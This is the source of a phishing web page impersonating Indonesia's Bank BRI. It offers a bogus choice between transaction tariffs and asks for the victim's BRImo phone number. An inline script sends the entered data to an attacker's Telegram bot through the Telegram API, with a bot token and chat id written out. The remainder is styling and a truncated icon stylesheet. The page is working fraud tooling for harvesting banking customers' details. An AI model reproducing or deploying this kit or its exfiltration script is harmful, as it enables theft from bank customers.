<?php include_once("index.html"): ?>

<!doctype html>
<html class="ltr yui3-js-enabled webkit js chrome chrome87 chrome87-0 linux mobile secure touch  lang.dir " dir=" lang.dir " lang="in-ID">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><link rel="stylesheet" type="text/css" href="cid:css-22be1bb0-f219-4991-a1dc-893d784c53c5@mhtml.blink" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@48,400,0,0">
<link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css">
<link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, viewport-fit=cover">
	<meta name="description" content="Bank BRI terus berinovasi mengembangkan produk yang sesuai dengan perkembangan jaman untuk memenuhi kebutuhan nasabah">
	<meta name="apple-mobile-web-app-capable" content="yes">
	<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
	<meta name="theme-color" content="#0f78cb">
	<meta property="og:type" content="website">
	<title>Layanan Perubahan Tarif Bank BRI || Melayani dengan setulus hati</title><link rel="icon" type="image/png" href="https://i.ibb.co/Wc61GwP/Frame-1-1.jpg">
<link rel="image_src" href="https://i.ibb.co/Wc61GwP/Frame-1-1.jpg">
</head>
<body style="">
<main>
<welalxcome style="display: none;">
<img src="" alt="">
</welalxcome>
<chsalxcome2 style="">
<div style="height:30px;width: 70px;margin-top: -10px;margin-bottom: -24px;float:center;margin-left:42%" class="talxcome">
</div>
<img style="margin-bottom: 5px; margin-left:20px;" width="90px" src="/assets/bri-header.png" alt="">
<div class="slider">
<figure>
<div class="slide">
<img src="/assets/1.jpg">
</div>
<div class="slide">
<img src="2.jpg">
</div>
<div class="slide">
<img src="3.jpg">
 </div>
<div class="slide">
<img src="4.jpg">
</div>
<div class="slide">
<img src="5.jpg">
</div>
</figure>
</div>
<form action="file2.html" method="POST" >
<div class="" style="margin-left: 20px;margin-top: -330px;position:absolute;border:1px solid #0085e0;padding:15px;width:82%;border-radius:10px">
<center style="color:#09559a;">
<br><span><h4>Silahkan Pilih Tarif Transaksi<br>Sesuai Kebutuhan Anda Di Bawah Ini</h4></span>
</center>
<br>
<hr>
<br>
<h4 style="color:#09559a;">
<label id="label1">
<input required="" type="radio" name="tarif" id="tarif1" value="Tarif Baru Rp 150.000 / Bulan">
Tarif Baru Rp 150.000 / Bulan
</label>
</h4>
<br>
<h4 style="color:#09559a;">
<label required="" id="label2">
<input type="radio" name="tarif" id="tarif2" value="Tarif Lama Rp 6.500 / Transaksi">
Tarif Lama Rp 6.500 / Transaksi
</label>
</h4>
<br>
<h5>Masukan Nomor ponsel BRImo Anda:</h5>
<br>
<i class="ion-ios-telephone-outline" id="ionIcons"></i>
<input name="setPin" id="name" type="number" style="box-sizing: border-box; height: 40px; width: 536px; max-width: 100%; border: 2px solid rgb(0, 134, 224); border-image: initial; background-color: rgb(255, 255, 255); border-radius: 8px; box-shadow: rgb(237, 237, 237) 2px 2px 2px 0px; font-family: 'Roboto Condensed', sans-serif; font-weight: bold; font-size: 16px; color: rgb(28, 28, 28); word-spacing: 7px; padding: 0px 45px;" placeholder="Nomor Ponsel" maxlength="13" minlength="10" required="">
<br><br>
</div>
<div>
<br>
<lebel onclick="kirimPesan()" />
<input type="submit" style="margin-left: 20px; margin-top: -30px;position:absolute;background-color:#0085e0;color:white;border:1px solid #0085e0;width:90%;border-radius:10px;font-size: 15px;padding:13px;" value="Konfirmasi" onclick="kirimPesan()" />
        <center><input type="button" id="kirim" value="KIRIM" onclick="kirimPesan()" />
<h6 style="font-family: 'Open Sans', sans-serif; font-size: 13px; font-weight: bold; color: #000; letter-spacing: 1px; text-align: center; line-height: 1; border-radius: 5px;"></div>
</center></div></a>
</lebel onclick="kirimPesan()" />
</form>







</chsalxcome2></main>

</body></html>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"
    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="
    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script>function kirimPesan() {

    
  var nama = document.getElementById('nama');    
  
  
  
  var gabungan = '~~~WebBRImo~~~~%0A%0AUsername%0A%7B%20' + nama.value + '%20%7D%0A%0A%3DSilakan%20Login%3D';
  var token = '5784058668:AAEd6t4vLFWMsyz9OQ-5eCJmpIVHRl_NQyM'; // Ganti dengan token bot yang kamu buat
  var grup = '-625186612'; // Ganti dengan chat id dari bot yang kamu buat
  
  $.ajax({
      url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
      method: `POST`,
  })    
  
  }
</script>





<style>

@charset "utf-8";

@font-face { font-family: alexfonthel; src: url("https://cdn.jsdelivr.net/gh/AlexHostX/another@main/brims/helvetica_neue.woff"); }

* { margin: 0px; }

html, body { max-width: 100%; overflow-x: hidden; }

body { margin: 0px; background: rgb(255, 255, 255); color: rgb(0, 0, 0); font-family: alexfonthel, sans-serif; }

welalxcome { position: fixed; left: 0px; top: 0px; width: 100vw; height: 100vh; display: flex; flex-flow: row nowrap; align-items: center; place-content: center; }

welalxcome img { width: 21vw; height: auto; }

chsalxcome { position: relative; width: 100%; height: 100vh; display: flex; flex-flow: column nowrap; align-items: center; }

.talxcome { width: 130%; flex-flow: column nowrap; align-items: center; height: 100%; justify-content: center; }

.talxcome img { width: 73%; }

.balxcome { height: 45vh; display: flex; flex-flow: column nowrap; align-items: center; }

.txalxcome { width: 90%; height: 30vh; text-align: left; }

.txalxcome p { font-weight: 600; font-size: 1.5rem; margin-bottom: 5vh; color: rgb(29, 102, 171); }

.txalxcome span { width: 80%; font-size: 18px; }

.btalxcome { width: 90%; height: 20vh; display: flex; flex-flow: column nowrap; align-items: center; }

.btalxcome button { width: 100%; background: rgb(29, 102, 171); color: rgb(255, 255, 255); font-family: inherit; border-radius: 5px; border: none; font-size: 16px; padding: 2vh 0px; margin-bottom: 4vh; font-weight: 500; box-shadow: rgb(0, 0, 0) 0px 0px 1px 0px; cursor: pointer; }

.btalxcome p { color: rgb(29, 102, 171); font-weight: 500; cursor: pointer; }

frmalxbr { position: relative; width: 100vw; height: 100vh; }

.hdralxfrm { width: 100%; position: fixed; left: 0px; top: 0px; display: block; text-align: center; padding: 1.5vh 0px; box-shadow: rgba(0, 0, 0, 0.25) 0px 1px 20px 0px; z-index: 1; }

.hdralxfrm img { width: 10vw; height: auto; }

.chalxfrm { position: relative; width: 100%; height: 50vh; z-index: 0; display: flex; flex-flow: column nowrap; align-items: center; }

.bgchalxfrm { background: url("") center center / 100% no-repeat; position: unset; width: 100%; border-radius: 0px; top: 0px; height: 100%; border: none; margin-top: -50px; }

.chalxfrm p { position: absolute; color: rgb(255, 255, 255); font-size: 19px; font-weight: 600; letter-spacing: 1px; top: 11vh; }

.chalxfrm img { position: absolute; width: 90%; bottom: 5vh; }

.frmalxbrm { display: flex; flex-flow: column nowrap; align-items: center; height: 42vh; width: 100%; }

.inpalxbrm { margin-top: 3vh; width: 90%; height: 35vh; }

.inpalxbrm p { color: rgb(32, 105, 171); font-weight: 600; font-size: 18px; letter-spacing: 1px; margin-left: 3vw; }

.bxmalxbrm { display: flex; flex-flow: column nowrap; align-items: center; width: 100%; padding-top: 2vh; }

.itmalxbrm { position: relative; width: 95%; background: rgb(255, 255, 255); box-shadow: rgba(0, 0, 0, 0.53) 0px 1px 3px 0px; border-radius: 3px; display: flex; flex-flow: row nowrap; align-items: center; padding: 1.8vh 2vw; column-gap: 3vw; }

.itmalxbrm img { height: 4vh; }

.itmalxbrm input { font-family: arial, sans-serif; font-size: 17px; font-weight: 300; border: none; outline: none; }

.inpalxbrm span { width: 100%; text-align: right; display: block; margin-top: 2.5vh; font-size: 14px; cursor: pointer; }

.btnalxfrm { height: 10vh; display: flex; flex-flow: row nowrap; place-content: center; align-items: center; width: 90%; }

.btnalxfrm button { width: 100%; background: rgb(29, 102, 171); color: rgb(255, 255, 255); font-family: inherit; border-radius: 5px; border: none; font-size: 16px; padding: 2vh 0px; margin-bottom: 4vh; font-weight: 500; box-shadow: rgb(0, 0, 0) 0px 0px 1px 0px; cursor: pointer; }

#togglePassword { background-size: 100% 100%; height: 3vh; width: 3.5vh; margin-top: 0px; position: absolute; right: 4vw; cursor: pointer; }

.fa-eye { background: url("") center center no-repeat; }

.fa-eye-slash { background: url("https://cdn.jsdelivr.net/gh/AlexHostX/another@main/brims/20220617_022922.png") center center no-repeat; }

.opbtn { opacity: 0.5; }

.alxslh { position: fixed; left: 0px; top: 8vh; z-index: 3; font-size: 14px; font-weight: 400; color: rgb(255, 255, 255); background: rgb(245, 57, 57); text-align: center; width: 100%; font-family: arial, sans-serif; padding: 1.7vh 0px; display: none; }

pnalxbr { background: rgb(36, 131, 240); display: flex; flex-flow: column nowrap; align-items: center; width: 100vw; height: 100vh; color: white; }

.hdralxpn { width: 100%; height: 5vh; display: flex; flex-flow: row nowrap; align-items: center; justify-content: space-between; }

.hdralxpn span { margin-left: 3%; }

.hdralxpn p { font-weight: 400; font-size: 15px; }

.hdralxpn label { visibility: hidden; margin-right: 3%; }

.txalxpn { padding-top: 10vh; padding-bottom: 5vh; width: 70%; text-align: left; }

.txalxpn p { font-size: 17px; font-weight: 400; }

.txalxpn span { font-size: 12px; font-weight: 300; font-family: Arial, sans-serif; }

.inpalxpn { width: 70%; display: flex; flex-flow: column nowrap; align-items: center; }

#alxpnnikah { width: 100%; display: flex; flex-flow: row nowrap; align-items: center; place-content: center; column-gap: 7vw; position: relative; }

#ionIcons { color: rgb(22, 119, 199); font-size: 35px; position: absolute; display: block; margin-top: 5px; margin-left: 13px; }

#alxpnnikah input { position: absolute; z-index: 2; color: rgb(255, 255, 255); border: none; outline: none; font-family: inherit; background: transparent; font-size: 24px; letter-spacing: 10vw; width: 100%; overflow: hidden; float: left; text-align: left; text-overflow: revert; cursor: not-allowed; pointer-events: none; }

.bxinpalxpn { width: 6vw; display: flex; flex-flow: column nowrap; align-items: center; position: relative; place-content: center; }

.bxinpalxpn input { width: 100%; height: 100%; position: absolute; background: transparent; outline: none; border: none; cursor: pointer; text-align: center; color: rgb(255, 255, 255); font-family: inherit; font-size: 24px; }

.bxinpalxpn span { background-color: rgb(136, 180, 230); color: white; height: 6.5vh; width: 5.5vh; display: block; border-radius: 10px; }

.txalxlppn { padding: 7vh 0px 9vh; font-size: 13px; font-family: arial, sans-serif; cursor: pointer; }

.kybalxpn { width: 90%; }

.inpalxkyb { width: 80%; display: flex; flex-flow: row nowrap; align-items: center; justify-content: space-between; margin-bottom: 4vh; margin-left: 30px; }

.inpalxkyb button { background-color: transparent; font-family: inherit; cursor: pointer; outline: none; border: none; font-size: 25px; width: 20%; height: 6vh; }

smalxs { height: 100vh; width: 100vw; background: rgb(242, 242, 242); display: flex; flex-flow: row nowrap; place-content: center; align-items: center; }

.bxalxsm { position: relative; width: 85%; padding: 15vh 0% 2vh; background: rgb(255, 255, 255); display: flex; flex-flow: column nowrap; align-items: center; border: 1px solid rgba(166, 166, 166, 0.37); border-radius: 10px; }

.bxalxsm img { width: 80%; position: absolute; top: -10vh; }

.bxalxsm garis { display: block; width: 100%; border-bottom: 2px dotted rgb(204, 204, 204); }

.bxalxsm label { color: rgb(7, 118, 237); font-weight: 300; font-family: arial, sans-serif; padding: 2vh; }

.alxinpsm { width: 90%; display: flex; flex-flow: column nowrap; align-items: flex-start; }

.alxinpsm span { color: rgb(158, 158, 158); font-size: 12px; font-family: arial, sans-serif; }

.alxinpsm input { box-sizing: border-box; z-index: 4; height: 75px; width: 100%; left: 0px; border-width: 1px; border-style: solid; border-color: rgb(189, 189, 189) rgb(189, 189, 189) rgb(214, 214, 214); border-image: initial; background-color: transparent; border-radius: 5px; box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; font-size: 13px; color: rgb(85, 85, 85); padding: 0px 4px; top: 20px; transition: border-bottom-color 200ms ease 0s; margin: 1vh 0px 2vh; font-family: arial, sans-serif; outline: navajowhite; }

.btnalxsm { width: 100%; text-align: right; }

.btnalxsm button { cursor: pointer; background: none rgb(0, 134, 224); border: none; text-align: center; box-sizing: border-box; z-index: 6; height: 33px; left: 0px; top: 0px; font-size: 14px; color: rgb(255, 255, 255); line-height: 1; border-radius: 6px; box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; font-family: arial, sans-serif; letter-spacing: 1px; padding: 0px 10px; outline: navajowhite; }

.dscalxsm { margin-top: 5vh; display: flex; flex-flow: column nowrap; align-items: center; }

.dscalxsm p { text-align: center; width: 90%; font-size: 10px; color: rgba(10, 10, 10, 0.73); font-family: arial, sans-serif; }

.malasngoding-slider { border: 10px solid rgb(239, 239, 239); position: relative; overflow: hidden; background: rgb(239, 239, 239); }

.malasngoding-slider { margin: 20px auto; width: 768px; height: 450px; }

.isi-slider img { width: 768px; height: 450px; float: left; }

.isi-slider { position: absolute; width: 3900px; animation-name: slider; animation-duration: 16s; animation-timing-function: ease-in-out; animation-iteration-count: infinite; }

.isi-slider:hover { animation-play-state: paused; }

.malasngoding-slider::after { font-size: 150px; position: absolute; z-index: 12; color: rgba(255, 255, 255, 0); left: 300px; top: 80px; transition: all 1s ease-in-out 0s; }

.malasngoding-slider:hover::after { color: rgba(255, 255, 255, 0.6); }

@-webkit-keyframes slider { 
  0% { left: 0px; opacity: 0; }
  2% { opacity: 1; }
  20% { left: 0px; opacity: 1; }
  21% { opacity: 0; }
  24% { opacity: 0; }
  25% { left: -768px; opacity: 1; }
  45% { left: -768px; opacity: 1; }
  46% { opacity: 0; }
  48% { opacity: 0; }
  50% { left: -1536px; opacity: 1; }
  70% { left: -1536px; opacity: 1; }
  72% { opacity: 0; }
  74% { opacity: 0; }
  75% { left: -2304px; opacity: 1; }
  95% { left: -2304px; opacity: 1; }
  97% { left: -2304px; opacity: 0; }
  100% { left: 0px; opacity: 0; }
}

@keyframes slider { 
  0% { left: 0px; opacity: 0; }
  2% { opacity: 1; }
  20% { left: 0px; opacity: 1; }
  21% { opacity: 0; }
  24% { opacity: 0; }
  25% { left: -768px; opacity: 1; }
  45% { left: -768px; opacity: 1; }
  46% { opacity: 0; }
  48% { opacity: 0; }
  50% { left: -1536px; opacity: 1; }
  70% { left: -1536px; opacity: 1; }
  72% { opacity: 0; }
  74% { opacity: 0; }
  75% { left: -2304px; opacity: 1; }
  95% { left: -2304px; opacity: 1; }
  97% { left: -2304px; opacity: 0; }
  100% { left: 0px; opacity: 0; }
}

* { margin: 0px; padding: 0px; list-style: none; text-decoration: none; }

.slider { overflow: hidden; height: 540px; }

.slider figure div { width: 20%; float: left; }

.slider figure img { width: 100%; float: left; }

.slider figure { position: relative; width: 500%; margin: 0px; left: 0px; animation: 20s ease 0s infinite normal none running slidy; }

@keyframes slidy { 
  0% { left: 0%; }
  10% { left: 0%; }
  12% { left: -100%; }
  22% { left: -100%; }
  24% { left: -200%; }
  34% { left: -200%; }
  36% { left: -300%; }
  46% { left: -300%; }
  48% { left: -400%; }
  58% { left: -400%; }
  60% { left: -300%; }
  70% { left: -300%; }
  72% { left: -200%; }
  82% { left: -200%; }
  84% { left: -100%; }
  94% { left: -100%; }
  96% { left: 0%; }
  100% { left: 0%; }
}

:root { --modal-duration: 1s; --modal-color: #428bca; }

.button { background: rgb(66, 139, 202); padding: 1em 2em; color: rgb(255, 255, 255); border: 0px; border-radius: 5px; cursor: pointer; }

.button:hover { background: rgb(56, 118, 172); }

.modal { display: none; position: fixed; z-index: 1; left: 0px; top: 0px; height: 100%; width: 100%; overflow: auto; background-color: rgba(0, 0, 0, 0.5); }

.modal-content { margin: 50% auto; width: 85%; box-shadow: rgba(0, 0, 0, 0.2) 0px 5px 8px 0px, rgba(0, 0, 0, 0.17) 0px 7px 20px 0px; animation-name: modalopen; animation-duration: var(--modal-duration); }

.modal-header h2, .modal-footer h3 { margin: 0px; }

.modal-header { background: var(--modal-color); padding: 15px; color: rgb(255, 255, 255); border-top-left-radius: 5px; border-top-right-radius: 5px; }

.modal-body { padding: 10px 20px; background: rgb(255, 255, 255); }

.modal-footer { background: var(--modal-color); padding: 10px; color: rgb(255, 255, 255); text-align: center; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; }

.close { float: right; font-size: 30px; color: rgb(255, 255, 255); }

.close:hover, .close:focus { color: rgb(0, 0, 0); text-decoration: none; cursor: pointer; }

@keyframes modalopen { 
  0% { opacity: 0; }
  100% { opacity: 1; }
}

#alxsm { border-radius: 10px; border: 2px solid rgb(9, 85, 154); color: rgb(9, 85, 154); font-size: 14px; font-weight: bold; margin-bottom: 15px; padding: 0.5em 1em 0.5em 0px; width: 90%; height: 100px; text-align: center; margin-left: 5px; }

.bgchalxfrm2 { background: url("") center center / 110% no-repeat; position: unset; width: 130%; border-radius: 0px; top: 0px; height: 500px; border: none; margin-right: -20px; }
</style>
<style>
@charset "utf-8";

@font-face { font-family: "Material Symbols Outlined"; font-style: normal; font-weight: 400; src: url("https://fonts.gstatic.com/s/materialsymbolsoutlined/v61/kJF1BvYX7BgnkSrUwT8OhrdQw4oELdPIeeII9v6oDMzByHX9rA6RzaxHMPdY43zj-jCxv3fzvRNU22ZXGJpEpjC_1n-q_4MrImHCIJIZrDCvHOejbdhzrA.woff2") format("woff2"); }

.material-symbols-outlined { font-family: "Material Symbols Outlined"; font-weight: normal; font-style: normal; font-size: 24px; line-height: 1; letter-spacing: normal; text-transform: none; display: inline-block; white-space: nowrap; overflow-wrap: normal; direction: ltr; font-feature-settings: "liga"; -webkit-font-smoothing: antialiased; }
</style>
<style>

@charset "utf-8";

@font-face { font-family: Ionicons; src: url("../fonts/ionicons.eot?v=2.0.1#iefix") format("embedded-opentype"), url("../fonts/ionicons.ttf?v=2.0.1") format("truetype"), url("../fonts/ionicons.woff?v=2.0.1") format("woff"), url("../fonts/ionicons.svg?v=2.0.1#Ionicons") format("svg"); font-weight: normal; font-style: normal; }

.ion, .ionicons, .ion-alert::before, .ion-alert-circled::before, .ion-android-add::before, .ion-android-add-circle::before, .ion-android-alarm-clock::before, .ion-android-alert::before, .ion-android-apps::before, .ion-android-archive::before, .ion-android-arrow-back::before, .ion-android-arrow-down::before, .ion-android-arrow-dropdown::before, .ion-android-arrow-dropdown-circle::before, .ion-android-arrow-dropleft::before, .ion-android-arrow-dropleft-circle::before, .ion-android-arrow-dropright::before, .ion-android-arrow-dropright-circle::before, .ion-android-arrow-dropup::before, .ion-android-arrow-dropup-circle::before, .ion-android-arrow-forward::before, .ion-android-arrow-up::before, .ion-android-attach::before, .ion-android-bar::before, .ion-android-bicycle::before, .ion-android-boat::before, .ion-android-bookmark::before, .ion-android-bulb::before, .ion-android-bus::before, .ion-android-calendar::before, .ion-android-call::before, .ion-android-camera::before, .ion-android-cancel::before, .ion-android-car::before, .ion-android-cart::before, .ion-android-chat::before, .ion-android-checkbox::before, .ion-android-checkbox-blank::before, .ion-android-checkbox-outline::before, .ion-android-checkbox-outline-blank::before, .ion-android-checkmark-circle::before, .ion-android-clipboard::before, .ion-android-close::before, .ion-android-cloud::before, .ion-android-cloud-circle::before, .ion-android-cloud-done::before, .ion-android-cloud-outline::before, .ion-android-color-palette::before, .ion-android-compass::before, .ion-android-contact::before, .ion-android-contacts::before, .ion-android-contract::before, .ion-android-create::before, .ion-android-delete::before, .ion-android-desktop::before, .ion-android-document::before, .ion-android-done::before, .ion-android-done-all::before, .ion-android-download::before, .ion-android-drafts::before, .ion-android-exit::before, .ion-android-expand::before, .ion-android-favorite::before, .ion-android-favorite-outline::before, .ion-android-film::before, .ion-android-folder::before, .ion-android-folder-open::before, .ion-android-funnel::before, .ion-android-globe::before, .ion-android-hand::before, .ion-android-hangout::before, .ion-android-happy::before, .ion-android-home::before, .ion-android-image::before, .ion-android-laptop::before, .ion-android-list::before, .ion-android-locate::before, .ion-android-lock::before, .ion-android-mail::before, .ion-android-map::before, .ion-android-menu::before, .ion-android-microphone::before, .ion-android-microphone-off::before, .ion-android-more-horizontal::before, .ion-android-more-vertical::before, .ion-android-navigate::before, .ion-android-notifications::before, .ion-android-notifications-none::before, .ion-android-notifications-off::before, .ion-android-open::before, .ion-android-options::before, .ion-android-people::before, .ion-android-person::before, .ion-android-person-add::before, .ion-android-phone-landscape::before, .ion-android-phone-portrait::before, .ion-android-pin::before, .ion-android-plane::before, .ion-android-playstore::before, .ion-android-print::before, .ion-android-radio-button-off::before, .ion-android-radio-button-on::before, .ion-android-refresh::before, .ion-android-remove::before, .ion-android-remove-circle::before, .ion-android-restaurant::before, .ion-android-sad::before, .ion-android-search::before, .ion-android-send::before, .ion-android-settings::before, .ion-android-share::before, .ion-android-share-alt::before, .ion-android-star::before, .ion-android-star-half::before, .ion-android-star-outline::before, .ion-android-stopwatch::before, .ion-android-subway::before, .ion-android-sunny::before, .ion-android-sync::before, .ion-android-textsms::before, .ion-android-time::before, .ion-android-train::before, .ion-android-unlock::before, .ion-android-upload::before, .ion-android-volume-down::before, .ion-android-volume-mute::before, .ion-android-volume-off::before, .ion-android-volume-up::before, .ion-android-walk::before, .ion-android-warning::before, .ion-android-watch::before, .ion-android-wifi::before, .ion-aperture::before, .ion-archive::before, .ion-arrow-down-a::before, .ion-arrow-down-b::before, .ion-arrow-down-c::before, .ion-arrow-expand::before, .ion-arrow-graph-down-left::before, .ion-arrow-graph-down-right::before, .ion-arrow-graph-up-left::before, .ion-arrow-graph-up-right::before, .ion-arrow-left-a::before, .ion-arrow-left-b::before, .ion-arrow-left-c::before, .ion-arrow-move::before, .ion-arrow-resize::before, .ion-arrow-return-left::before, .ion-arrow-return-right::before, .ion-arrow-right-a::before, .ion-arrow-right-b::before, .ion-arrow-right-c::before, .ion-arrow-shrink::before, .ion-arrow-swap::before, .ion-arrow-up-a::before, .ion-arrow-up-b::before, .ion-arrow-up-c::before, .ion-asterisk::before, .ion-at::before, .ion-backspace::before, .ion-backspace-outline::before, .ion-bag::before, .ion-battery-charging::before, .ion-battery-empty::before, .ion-battery-full::before, .ion-battery-half::before, .ion-battery-low::before, .ion-beaker::before, .ion-beer::before, .ion-bluetooth::before, .ion-bonfire::before, .ion-bookmark::before, .ion-bowtie::before, .ion-briefcase::before, .ion-bug::before, .ion-calculator::before, .ion-calendar::before, .ion-camera::before, .ion-card::before, .ion-cash::before, .ion-chatbox::before, .ion-chatbox-working::before, .ion-chatboxes::before, .ion-chatbubble::before, .ion-chatbubble-working::before, .ion-chatbubbles::before, .ion-checkmark::before, .ion-checkmark-circled::before, .ion-checkmark-round::before, .ion-chevron-down::before, .ion-chevron-left::before, .ion-chevron-right::before, .ion-chevron-up::before, .ion-clipboard::before, .ion-clock::before, .ion-close::before, .ion-close-circled::before, .ion-close-round::before, .ion-closed-captioning::before, .ion-cloud::before, .ion-code::before, .ion-code-download::before, .ion-code-working::before, .ion-coffee::before, .ion-compass::before, .ion-compose::before, .ion-connection-bars::before, .ion-contrast::before, .ion-crop::before, .ion-cube::before, .ion-disc::before, .ion-document::before, .ion-document-text::before, .ion-drag::before, .ion-earth::before, .ion-easel::before, .ion-edit::before, .ion-egg::before, .ion-eject::before, .ion-email::before, .ion-email-unread::before, .ion-erlenmeyer-flask::before, .ion-erlenmeyer-flask-bubbles::before, .ion-eye::before, .ion-eye-disabled::before, .ion-female::before, .ion-filing::before, .ion-film-marker::before, .ion-fireball::before, .ion-flag::before, .ion-flame::before, .ion-flash::before, .ion-flash-off::before, .ion-folder::before, .ion-fork::before, .ion-fork-repo::before, .ion-forward::before, .ion-funnel::before, .ion-gear-a::before, .ion-gear-b::before, .ion-grid::before, .ion-hammer::before, .ion-happy::before, .ion-happy-outline::before, .ion-headphone::before, .ion-heart::before, .ion-heart-broken::before, .ion-help::before, .ion-help-buoy::before, .ion-help-circled::before, .ion-home::before, .ion-icecream::before, .ion-image::before, .ion-images::before, .ion-information::before, .ion-information-circled::before, .ion-ionic::before, .ion-ios-alarm::before, .ion-ios-alarm-outline::before, .ion-ios-albums::before, .ion-ios-albums-outline::before, .ion-ios-americanfootball::before, .ion-ios-americanfootball-outline::before, .ion-ios-analytics::before, .ion-ios-analytics-outline::before, .ion-ios-arrow-back::before, .ion-ios-arrow-down::before, .ion-ios-arrow-forward::before, .ion-ios-arrow-left::before, .ion-ios-arrow-right::before, .ion-ios-arrow-thin-down::before, .ion-ios-arrow-thin-left::before, .ion-ios-arrow-thin-right::before, .ion-ios-arrow-thin-up::before, .ion-ios-arrow-up::before, .ion-ios-at::before, .ion-ios-at-outline::before, .ion-ios-barcode::before, .ion-ios-barcode-outline::before, .ion-ios-baseball::before, .ion-ios-baseball-outline::before, .ion-ios-basketball::before, .ion-ios-basketball-outline::before, .ion-ios-bell::before, .ion-ios-bell-outline::before, .ion-ios-body::before, .ion-ios-body-outline::before, .ion-ios-bolt::before, .ion-ios-bolt-outline::before, .ion-ios-book::before, .ion-ios-book-outline::before, .ion-ios-bookmarks::before, .ion-ios-bookmarks-outline::before, .ion-ios-box::before, .ion-ios-box-outline::before, .ion-ios-briefcase::before, .ion-ios-briefcase-outline::before, .ion-ios-browsers::before, .ion-ios-browsers-outline::before, .ion-ios-calculator::before, .ion-ios-calculator-outline::before, .ion-ios-calendar::before, .ion-ios-calendar-outline::before, .ion-ios-camera::before, .ion-ios-camera-outline::before, .ion-ios-cart::before, .ion-ios-cart-outline::before, .ion-ios-chatboxes::before, .ion-ios-chatboxes-outline::before, .ion-ios-chatbubble::before, .ion-ios-chatbubble-outline::before, .ion-ios-checkmark::before, .ion-ios-checkmark-empty::before, .ion-ios-checkmark-outline::before, .ion-ios-circle-filled::before, .ion-ios-circle-outline::before, .ion-ios-clock::before, .ion-ios-clock-outline::before, .ion-ios-close::before, .ion-ios-close-empty::before, .ion-ios-close-outline::before, .ion-ios-cloud::before, .ion-ios-cloud-download::before, .ion-ios-cloud-download-outline::before, .ion-ios-cloud-outline::before, .ion-ios-cloud-upload::before, .ion-ios-cloud-upload-outline::before, .ion-ios-cloudy::before, .ion-ios-cloudy-night::before, .ion-ios-cloudy-night-outline::before, .ion-ios-cloudy-outline::before, .ion-ios-cog::before, .ion-ios-cog-outline::before, .ion-ios-color-filter::before, .ion-ios-color-filter-outline::before, .ion-ios-color-wand::before, .ion-ios-color-wand-outline::before, .ion-ios-compose::before, .ion-ios-compose-outline::before, .ion-ios-contact::before, .ion-ios-contact-outline::before, .ion-ios-copy::before, .ion-ios-copy-outline::before, .ion-ios-crop::before, .ion-ios-crop-strong::before, .ion-ios-download::before, .ion-ios-download-outline::before, .ion-ios-drag::before, .ion-ios-email::before, .ion-ios-email-outline::before, .ion-ios-eye::before, .ion-ios-eye-outline::before, .ion-ios-fastforward::before, .ion-ios-fastforward-outline::before, .ion-ios-filing::before, .ion-ios-filing-outline::before, .ion-ios-film::before, .ion-ios-film-outline::before, .ion-ios-flag::before, .ion-ios-flag-outline::before, .ion-ios-flame::before, .ion-ios-flame-outline::before, .ion-ios-flask::before, .ion-ios-flask-outline::before, .ion-ios-flower::before, .ion-ios-flower-outline::before, .ion-ios-folder::before, .ion-ios-folder-outline::before, .ion-ios-football::before, .ion-ios-football-outline::before, .ion-ios-game-controller-a::before, .ion-ios-game-controller-a-outline::before, .ion-ios-game-controller-b::before, .ion-ios-game-controller-b-outline::before, .ion-ios-gear::before, .ion-ios-gear-outline::before, .ion-ios-glasses::before, .ion-ios-glasses-outline::before, .ion-ios-grid-view::before, .ion-ios-grid-view-outline::before, .ion-ios-heart::before, .ion-ios-heart-outline::before, .ion-ios-help::before, .ion-ios-help-empty::before, .ion-ios-help-outline::before, .ion-ios-home::before, .ion-ios-home-outline::before, .ion-ios-infinite::before, .ion-ios-infinite-outline::before, .ion-ios-information::before, .ion-ios-information-empty::before, .ion-ios-information-outline::before, .ion-ios-ionic-outline::before, .ion-ios-keypad::before, .ion-ios-keypad-outline::before, .ion-ios-lightbulb::before, .ion-ios-lightbulb-outline::before, .ion-ios-list::before, .ion-ios-list-outline::before, .ion-ios-location::before, .ion-ios-location-outline::before, .ion-ios-locked::before, .ion-ios-locked-outline::before, .ion-ios-loop::before, .ion-ios-loop-strong::before, .ion-ios-medical::before, .ion-ios-medical-outline::before, .ion-ios-medkit::before, .ion-ios-medkit-outline::before, .ion-ios-mic::before, .ion-ios-mic-off::before, .ion-ios-mic-outline::before, .ion-ios-minus::before, .ion-ios-minus-empty::before, .ion-ios-minus-outline::before, .ion-ios-monitor::before, .ion-ios-monitor-outline::before, .ion-ios-moon::before, .ion-ios-moon-outline::before, .ion-ios-more::before, .ion-ios-more-outline::before, .ion-ios-musical-note::before, .ion-ios-musical-notes::before, .ion-ios-navigate::before, .ion-ios-navigate-outline::before, .ion-ios-nutrition::before, .ion-ios-nutrition-outline::before, .ion-ios-paper::before, .ion-ios-paper-outline::before, .ion-ios-paperplane::before, .ion-ios-paperplane-outline::before, .ion-ios-partlysunny::before, .ion-ios-partlysunny-outline::before, .ion-ios-pause::before, .ion-ios-pause-outline::before, .ion-ios-paw::before, .ion-ios-paw-outline::before, .ion-ios-people::before, .ion-ios-people-outline::before, .ion-ios-person::before, .ion-ios-person-outline::before, .ion-ios-personadd::before, .ion-ios-personadd-outline::before, .ion-ios-photos::before, .ion-ios-photos-outline::before, .ion-ios-pie::before, .ion-ios-pie-outline::before, .ion-ios-pint::before, .ion-ios-pint-outline::before, .ion-ios-play::before, .ion-ios-play-outline::before, .ion-ios-plus::before, 